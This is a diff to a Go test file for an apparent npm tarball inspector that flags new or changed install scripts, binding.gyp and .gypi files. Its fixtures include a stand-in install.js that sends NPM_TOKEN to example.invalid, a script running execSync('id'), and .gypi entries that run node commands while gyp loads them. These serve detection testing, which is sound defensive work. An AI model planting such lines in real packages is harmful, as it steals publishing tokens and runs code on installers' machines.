@@ -50,10 +50,11 @@ func TestReadHooks(t *testing.T) {
 	}
 }
 
-// The tarballs' own word on the install step (spec section 11, amendment
-// 5): for every package.json in the new tarball, bundled packages
-// included, the install scripts, "gypfile" and the binding.gyp beside it
-// are the old tarball's at the same path, and absent where it has none.
+// The tarballs' own word on the install step (spec section 11, amendments
+// 5, 25 and 58): for every package.json in the new tarball, bundled
+// packages included, the install scripts, "gypfile" and the binding.gyp
+// beside it are the old tarball's at the same path, and absent where it
+// has none; and every .gypi file is the same file in both.
 func TestInspectTarballs(t *testing.T) {
 	const plain = `{"name":"a","version":"1.0.0","scripts":{"test":"mocha"}}`
 	const next = `{"name":"a","version":"1.1.0","scripts":{"test":"mocha"}}`
@@ -64,6 +65,8 @@ func TestInspectTarballs(t *testing.T) {
 	// A package that ships a binding.gyp and tells npm not to build it.
 	const prebuilt = `{"name":"a","version":"1.0.0","gypfile":false}`
 	const gyp = `{"targets":[{"target_name":"a","sources":["src/a.cc"]}]}`
+	// A .gypi that runs a command while gyp loads it.
+	const gypi = `{"variables":{"made":"<!(node -e \"require('./tools/make')\")"}}`
 	const inner = "node_modules/inner/package.json"
 	const innerGyp = "node_modules/inner/binding.gyp"
 	bump := func(manifest string) string { return strings.Replace(manifest, "1.0.0", "1.1.0", 1) }
@@ -88,15 +91,15 @@ func TestInspectTarballs(t *testing.T) {
 		want     string // a piece of the Value
 	}{
 		// The three inputs are the old tarball's, or absent on both sides.
-		{"no install step on either side", pkg(plain), pkg(next), yes, "no install hook command, gypfile or binding.gyp is new, changed or gone in 1 package.json (0 binding.gyp present); the files these run were not compared"},
-		{"a new name with no install step", nil, pkg(plain), yes, "in 1 package.json (0 binding.gyp present)"},
+		{"no install step on either side", pkg(plain), pkg(next), yes, "no install hook command, gypfile, binding.gyp or .gypi file is new, changed or gone in 1 package.json (0 binding.gyp and .gypi files present); the other files these run were not compared"},
+		{"a new name with no install step", nil, pkg(plain), yes, "in 1 package.json (0 binding.gyp and .gypi files present)"},
 		{"the same script on both sides", pkg(withScript), pkg(withScript), yes, "in 1 package.json"},
 		{"the same script, another version field", pkg(withScript), pkg(bump(withScript)), yes, "in 1 package.json"},
-		{"a script and binding.gyp on both sides", pkg(withScript, "binding.gyp", "{}"), pkg(bump(withScript), "binding.gyp", "{}"), yes, "(1 binding.gyp present)"},
-		{"an install script and a binding.gyp, both unchanged in a new version", pkg(building, "binding.gyp", gyp), pkg(bump(building), "binding.gyp", gyp), yes, "(1 binding.gyp present)"},
-		{"a binding.gyp and no script on either side", pkg(plain, "binding.gyp", gyp), pkg(next, "binding.gyp", gyp), yes, "(1 binding.gyp present)"},
-		{"gypfile false beside a binding.gyp on both sides", pkg(prebuilt, "binding.gyp", gyp), pkg(bump(prebuilt), "binding.gyp", gyp), yes, "(1 binding.gyp present)"},
-		{"gypfile true on both sides", pkg(`{"version":"1.0.0","gypfile":true}`, "binding.gyp", gyp), pkg(`{"version":"1.1.0","gypfile":true}`, "binding.gyp", gyp), yes, "(1 binding.gyp present)"},
+		{"a script and binding.gyp on both sides", pkg(withScript, "binding.gyp", "{}"), pkg(bump(withScript), "binding.gyp", "{}"), yes, "(1 binding.gyp and .gypi files present)"},
+		{"an install script and a binding.gyp, both unchanged in a new version", pkg(building, "binding.gyp", gyp), pkg(bump(building), "binding.gyp", gyp), yes, "(1 binding.gyp and .gypi files present)"},
+		{"a binding.gyp and no script on either side", pkg(plain, "binding.gyp", gyp), pkg(next, "binding.gyp", gyp), yes, "(1 binding.gyp and .gypi files present)"},
+		{"gypfile false beside a binding.gyp on both sides", pkg(prebuilt, "binding.gyp", gyp), pkg(bump(prebuilt), "binding.gyp", gyp), yes, "(1 binding.gyp and .gypi files present)"},
+		{"gypfile true on both sides", pkg(`{"version":"1.0.0","gypfile":true}`, "binding.gyp", gyp), pkg(`{"version":"1.1.0","gypfile":true}`, "binding.gyp", gyp), yes, "(1 binding.gyp and .gypi files present)"},
 
 		// An install script: added, changed or removed.
 		{"a hook is added", pkg(plain), pkg(withScript), no, `the install scripts of package.json change from none to postinstall: "node install.js"`},
@@ -128,10 +131,35 @@ func TestInspectTarballs(t *testing.T) {
 		{"the install script and the binding.gyp are both removed", pkg(building, "binding.gyp", gyp), pkg(plain), no, "binding.gyp is gone"},
 		{"a new name with binding.gyp", nil, pkg(plain, "binding.gyp", "{}"), no, "binding.gyp is new"},
 		// One with no package.json beside it is compared the same way.
-		{"a binding.gyp without a package.json, unchanged", pkg(plain, "addon/binding.gyp", gyp), pkg(next, "addon/binding.gyp", gyp), yes, "in 1 package.json (1 binding.gyp present)"},
+		{"a binding.gyp without a package.json, unchanged", pkg(plain, "addon/binding.gyp", gyp), pkg(next, "addon/binding.gyp", gyp), yes, "in 1 package.json (1 binding.gyp and .gypi files present)"},
 		{"a binding.gyp without a package.json, new", pkg(plain), pkg(plain, "addon/binding.gyp", gyp), no, "addon/binding.gyp is new"},
 		{"a binding.gyp without a package.json, changed", pkg(plain, "addon/binding.gyp", gyp), pkg(plain, "addon/binding.gyp", gyp+" "), no, "addon/binding.gyp changes"},
 		{"a new package.json beside an old binding.gyp", pkg(plain, "addon/binding.gyp", gyp), pkg(plain, "addon/binding.gyp", gyp, "addon/package.json", `{"name":"addon"}`), no, "addon/package.json is new beside a binding.gyp"},
+
+		// A .gypi file is read by gyp as a binding.gyp is: one that a
+		// binding.gyp includes, and a config.gypi or common.gypi that
+		// node-gyp includes by itself. New, changed or gone, at any depth,
+		// it is a change of what the package is built from (spec section
+		// 11, amendment 58).
+		{"a binding.gyp and a .gypi, both unchanged", pkg(plain, "binding.gyp", gyp, "config.gypi", gypi), pkg(next, "binding.gyp", gyp, "config.gypi", gypi), yes, "(2 binding.gyp and .gypi files present)"},
+		{"a config.gypi appears beside an unchanged binding.gyp", pkg(plain, "binding.gyp", gyp), pkg(next, "binding.gyp", gyp, "config.gypi", gypi), no, "config.gypi is new: it is a file a package is built from"},
+		{"a common.gypi appears beside an unchanged binding.gyp and install script", pkg(building, "binding.gyp", gyp), pkg(bump(building), "binding.gyp", gyp, "common.gypi", gypi), no, "common.gypi is new"},
+		{"a .gypi changes", pkg(plain, "binding.gyp", gyp, "config.gypi", "{}"), pkg(next, "binding.gyp", gyp, "config.gypi", gypi), no, "config.gypi changes: it is a file a package is built from"},
+		{"a .gypi changes by one byte", pkg(plain, "binding.gyp", gyp, "config.gypi", gypi), pkg(next, "binding.gyp", gyp, "config.gypi", gypi+"\n"), no, "config.gypi changes"},
+		{"a .gypi is gone and the binding.gyp stays", pkg(plain, "binding.gyp", gyp, "config.gypi", gypi), pkg(next, "binding.gyp", gyp), no, "config.gypi is gone: it is a file a package is built from"},
+		{"a .gypi of any name, in a directory, appears", pkg(plain, "binding.gyp", gyp), pkg(next, "binding.gyp", gyp, "build/flags.gypi", gypi), no, "build/flags.gypi is new"},
+		{"a .gypi in a directory changes", pkg(plain, "deps/zlib/zlib.gypi", "{}"), pkg(next, "deps/zlib/zlib.gypi", gypi), no, "deps/zlib/zlib.gypi changes"},
+		{"a .gypi in a directory is gone", pkg(plain, "deps/zlib/zlib.gypi", gypi), pkg(next), no, "deps/zlib/zlib.gypi is gone"},
+		{"a .gypi with no binding.gyp anywhere appears", pkg(plain), pkg(next, "config.gypi", gypi), no, "config.gypi is new"},
+		{"a file named only .gypi appears", pkg(plain), pkg(next, "build/.gypi", gypi), no, "build/.gypi is new"},
+		{"a new name with a .gypi", nil, pkg(plain, "config.gypi", gypi), no, "config.gypi is new"},
+		{"a bundled package gains a .gypi", pkg(plain, inner, plain, innerGyp, gyp), pkg(next, inner, plain, innerGyp, gyp, "node_modules/inner/common.gypi", gypi), no, "node_modules/inner/common.gypi is new"},
+		// A .gypi belongs to no package.json: a binding.gyp anywhere may
+		// include it by path, so one that is gone counts wherever it was.
+		{"a bundled package is removed with its .gypi", pkg(plain, inner, plain, "node_modules/inner/common.gypi", gypi), pkg(next), no, "node_modules/inner/common.gypi is gone"},
+		// Other names are other files: the model reads them.
+		{"a .gyp file that is not binding.gyp changes", pkg(plain, "deps/zlib.gyp", "{}"), pkg(next, "deps/zlib.gyp", gyp), yes, "(0 binding.gyp and .gypi files present)"},
+		{"names that only look like it", pkg(plain), pkg(next, "config.gypi.txt", gypi, "gypi", gypi, "Binding.GYPI", gypi), yes, "(0 binding.gyp and .gypi files present)"},
 
 		// Bundled dependencies are part of the tarball and are held to
 		// the same rule, each at its own path.
@@ -147,7 +175,7 @@ func TestInspectTarballs(t *testing.T) {
 		{"a bundled package drops its install script and keeps its binding.gyp", pkg(plain, inner, building, innerGyp, gyp), pkg(plain, inner, plain, innerGyp, gyp), no, "the install scripts of node_modules/inner/package.json change from install: "},
 		{"a bundled package drops gypfile false and keeps its binding.gyp", pkg(plain, inner, prebuilt, innerGyp, gyp), pkg(plain, inner, plain, innerGyp, gyp), no, "gypfile of node_modules/inner/package.json changes"},
 		// What is gone with its package.json is not in the new tarball.
-		{"a bundled package is removed with its binding.gyp", pkg(plain, inner, building, innerGyp, gyp), pkg(next), yes, "in 1 package.json (0 binding.gyp present)"},
+		{"a bundled package is removed with its binding.gyp", pkg(plain, inner, building, innerGyp, gyp), pkg(next), yes, "in 1 package.json (0 binding.gyp and .gypi files present)"},
 		{"a package bundled two levels down", pkg(plain), pkg(plain, inner, plain, "node_modules/inner/node_modules/deep/package.json", withScript), no, "node_modules/inner/node_modules/deep/package.json is new and has an install script"},
 		{"a new name that bundles a package with a script", nil, pkg(plain, inner, withScript), no, "node_modules/inner/package.json is new and has an install script"},
 		{"a new name that bundles quiet packages", nil, pkg(plain, inner, plain), yes, "in 2 package.json"},
@@ -191,33 +219,43 @@ func TestInspectTarballs(t *testing.T) {
 	var _ artifact.Inspect = InspectTarballs
 }
 
-// The comparison stops at what package.json and binding.gyp say. A
-// version that keeps its postinstall command and its binding.gyp and
-// rewrites the file the command runs, a file the binding.gyp includes and
-// a file one of its actions runs still has the fact: those files are in
-// the diff the model reads. The Value must say that they were not
-// compared, so "unchanged" is not read as covering them.
+// The comparison stops at what package.json, binding.gyp and the .gypi
+// files say. A version that keeps its postinstall command, its
+// binding.gyp and its .gypi and rewrites the file the command runs, a
+// file the binding.gyp includes under another name and a file one of its
+// actions runs still has the fact: those files are in the diff the model
+// reads. The Value must say that they were not compared, so "unchanged"
+// is not read as covering them. The same version with the .gypi
+// rewritten does not have it (spec section 11, amendment 58).
 func TestInspectTarballsDoesNotCompareWhatAHookRuns(t *testing.T) {
-	const gyp = `{"includes":["common.gypi"],"targets":[{"target_name":"a","actions":[{"action_name":"gen","inputs":[],"outputs":["o"],"action":["node","gen.js"]}]}]}`
-	tarball := func(version, installJS, gypi, genJS string) fs.FS {
+	const gyp = `{"includes":["common.gypi","build/settings.inc"],"targets":[{"target_name":"a","actions":[{"action_name":"gen","inputs":[],"outputs":["o"],"action":["node","gen.js"]}]}]}`
+	tarball := func(version, installJS, gypi, inc, genJS string) fs.FS {
 		return fstest.MapFS{
-			"package.json": {Data: []byte(`{"name":"a","version":"` + version + `","scripts":{"postinstall":"node install.js"},"gypfile":true}`)},
-			"binding.gyp":  {Data: []byte(gyp)},
-			"install.js":   {Data: []byte(installJS)},
-			"common.gypi":  {Data: []byte(gypi)},
-			"gen.js":       {Data: []byte(genJS)},
+			"package.json":       {Data: []byte(`{"name":"a","version":"` + version + `","scripts":{"postinstall":"node install.js"},"gypfile":true}`)},
+			"binding.gyp":        {Data: []byte(gyp)},
+			"install.js":         {Data: []byte(installJS)},
+			"common.gypi":        {Data: []byte(gypi)},
+			"build/settings.inc": {Data: []byte(inc)},
+			"gen.js":             {Data: []byte(genJS)},
 		}
 	}
-	old := tarball("1.0.0", "console.log('built')\n", "{}", "// writes o\n")
+	const command = `{"variables":{"x":"<!(node -e \"more()\")"}}`
+	old := tarball("1.0.0", "console.log('built')\n", "{}", "{}", "// writes o\n")
 	rewritten := tarball("1.0.1", "require('https').get('https://example.invalid/' + process.env.NPM_TOKEN)\n",
-		`{"variables":{"x":"<!(node -e \"more()\")"}}`, "require('child_process').execSync('id')\n")
+		"{}", command, "require('child_process').execSync('id')\n")
 
 	got := InspectTarballs(old, rewritten)
 	if !got.Holds() {
-		t.Fatalf("InspectTarballs = %+v: the rule compares hook commands, gypfile and binding.gyp, and all three are the old tarball's", got)
+		t.Fatalf("InspectTarballs = %+v: the rule compares hook commands, gypfile, binding.gyp and .gypi files, and all are the old tarball's", got)
 	}
-	if !strings.Contains(got.Value, "no install hook command, gypfile or binding.gyp is new, changed or gone") || !strings.Contains(got.Value, "the files these run were not compared") {
-		t.Errorf("Value = %q, want it to name hook commands and to say the files they run were not compared", got.Value)
+	if !strings.Contains(got.Value, "no install hook command, gypfile, binding.gyp or .gypi file is new, changed or gone") || !strings.Contains(got.Value, "the other files these run were not compared") {
+		t.Errorf("Value = %q, want it to name what was compared and to say the other files these run were not", got.Value)
+	}
+
+	// The file the binding.gyp includes as a .gypi is compared.
+	included := tarball("1.0.1", "console.log('built')\n", command, "{}", "// writes o\n")
+	if got := InspectTarballs(old, included); got.Holds() || !got.Gathered() || !strings.Contains(got.Value, "common.gypi changes") {
+		t.Errorf("InspectTarballs = %+v, want a no for the .gypi that gained a command", got)
 	}
 }
 
@@ -229,7 +267,7 @@ func TestInspectTarballsIsAndedIn(t *testing.T) {
 	plain := fstest.MapFS{"package.json": {Data: []byte(`{"name":"a"}`)}}
 	scripted := fstest.MapFS{"package.json": {Data: []byte(`{"scripts":{"install":"x"}}`)}}
 
-	if got := registry.And(InspectTarballs(plain, plain)); !got.Holds() || !strings.Contains(got.Value, "by the registry's metadata and the lock; no install hook command, gypfile or binding.gyp is new, changed or gone") || !strings.Contains(got.Source, tarballSource) {
+	if got := registry.And(InspectTarballs(plain, plain)); !got.Holds() || !strings.Contains(got.Value, "by the registry's metadata and the lock; no install hook command, gypfile, binding.gyp or .gypi file is new, changed or gone") || !strings.Contains(got.Source, tarballSource) {
 		t.Errorf("both hold: %+v", got)
 	}
 	if got := registry.And(InspectTarballs(plain, scripted)); got.Holds() || !got.Gathered() || !strings.Contains(got.Value, "install scripts of package.json change") {
@@ -277,5 +315,13 @@ func TestInspectTarballsOnDisk(t *testing.T) {
 	gyp := map[string]string{"package.json": `{"name":"a"}`, "node_modules/b/package.json": `{"name":"b"}`, "node_modules/b/binding.gyp": "{}"}
 	if got := InspectTarballs(write(plain), write(gyp)); got.Holds() || !strings.Contains(got.Value, "node_modules/b/binding.gyp is new") {
 		t.Errorf("a new bundled binding.gyp on disk: %+v", got)
+	}
+	// The old tree is walked too, for a .gypi that is gone.
+	gypi := map[string]string{"package.json": `{"name":"a"}`, "node_modules/b/package.json": `{"name":"b"}`, "node_modules/b/build/config.gypi": "{}"}
+	if got := InspectTarballs(write(gypi), write(gypi)); !got.Holds() || !strings.Contains(got.Value, "(1 binding.gyp and .gypi files present)") {
+		t.Errorf("an unchanged .gypi on disk: %+v", got)
+	}
+	if got := InspectTarballs(write(gypi), write(plain)); got.Holds() || !got.Gathered() || !strings.Contains(got.Value, "node_modules/b/build/config.gypi is gone") {
+		t.Errorf("a .gypi that is gone on disk: %+v", got)
 	}
 }
